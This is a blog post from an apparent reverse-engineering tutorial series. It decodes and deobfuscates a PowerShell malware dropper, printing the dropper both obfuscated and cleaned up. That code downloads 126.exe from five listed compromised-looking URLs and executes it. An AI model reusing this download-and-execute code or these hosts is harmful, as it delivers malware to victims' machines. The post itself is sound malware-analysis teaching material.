---
title: Dropper analysis
---

Whole script was encoed in Base64. In order to decode it I used this PowerShell script:

```powershell                    
$EncodedString = get-content Base64String.txt
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedString )) | Out-File -Encoding "ASCII" Decoded.txt
```                    
                
As input the script takes the encoded string from Base64String.txt, decodes it and saves result in Decoded.txt file.

Dropper's code looked like that:

```powershell       
<# https://www.microsoft.com/ #> $Refined_Plastic_Soapzpp='Bordersodi';$realtimevfb = '126';
$invoiceoaj='framerlj';$middlewareltk=$env:userprofile+'\'+$realtimevfb+'.exe';
$back_upjvi='Berkshirekwz';$Plazakpi=.('new-'+'ob'+'ject') NEt.WebCLieNT;
$Dynamicqmb='http://www.pieceofpassion.net/0xrnl3/a27xm99fgd_on7xp-31134189/
@http://www.marketfxelite.com/wp-admin/unnJtCHk/@https://tananfood.com/wp-includes/yoclwyWE/
@http://raisabook.com/wp-content/NjBtuxBzkD/@http://biswalfoodcircle.com/vcobhlons/kaf6j_71wzkgvqso-8/'."sP`Lit"('@');
$Clubomb='Estateswjs';foreach($Music__Gamespmu in $Dynamicqmb){try{$Plazakpi."dO`wN`lOa`dfiLE"($Music__Gamespmu, $middlewareltk);
$Applicationsiqr='Grocerytiw';If ((&('Get'+'-I'+'tem') $middlewareltk)."LE`NgTh" -ge 35609) 
{[Diagnostics.Process]::"s`TARt"($middlewareltk);$transformvdp='Bedfordshirejwc';break;$Concreteija='redundantwwi'}}catch{}}
$morphtqb='Gorgeous_Fresh_Hatiqb'
```

It was also obfuscated so I deobfuscated it (here it was much simpler).

```powershell                
<# https://www.microsoft.com/ #> 
$file_name = '126';
$file_path = $ENV:USERPROFILE;
$file_full_path = $file_path + '\' + $file_name + '.exe';

$web_client = .('new-object') NET.WebClient;
$url_list = 'http://www.pieceofpassion.net/0xrnl3/a27xm99fgd_on7xp-31134189/
        @http://www.marketfxelite.com/wp-admin/unnJtCHk/
        @https://tananfood.com/wp-includes/yoclwyWE/
        @http://raisabook.com/wp-content/NjBtuxBzkD/
        @http://biswalfoodcircle.com/vcobhlons/kaf6j_71wzkgvqso-8/'."SPLIT"('@');

foreach ($url in $url_list) {
try {
    $web_client.DownloadFile($url, $file_full_path);
    If ((&('Get-Item') $file_full_path)."Length" -ge 35609) {
        [Diagnostics.Process]::"Start"($file_full_path);
        break;
    }
} catch {}
}
```   

Explanation is presented below:

1.  The result file is 126.exe, that file will be created in user home directory what is pointed by file_full_path.
2.  Then WebClient object is created which allows for sending and recieving data identified by URI identifier. ('.' is a call operator)
3.  url_list is an array which contains URI identifiers. Split function separates URIs by the '@' character and places them in the next indexes of array.
4.  In for loop WebClient object tries to download the content of 126.exe file from sites stored in url_list.
5.  After each attempt to download the content, the script checks a size of resulted file. If size of that file is greater than 35609 bytes, the file is executed.

#### Table of content:

1.  [Environment configuration](/blog/first-steps-in-re/environment-configuration)
2.  [Initial analysis](/blog/first-steps-in-re/initial-analysis)
3.  [Macro analysis](/blog/first-steps-in-re/macro-analysis)
4.  [Dropper analysis](/blog/first-steps-in-re/dropper-analysis)
5.  [Detonation](/blog/first-steps-in-re/detonation)
7.  [Domain analysis](/blog/first-steps-in-re/domain-analysis)
8.  [Detonation ver. 2](/blog/first-steps-in-re/detonation-v2)
9.  [Summary](/blog/first-steps-in-re/summary)
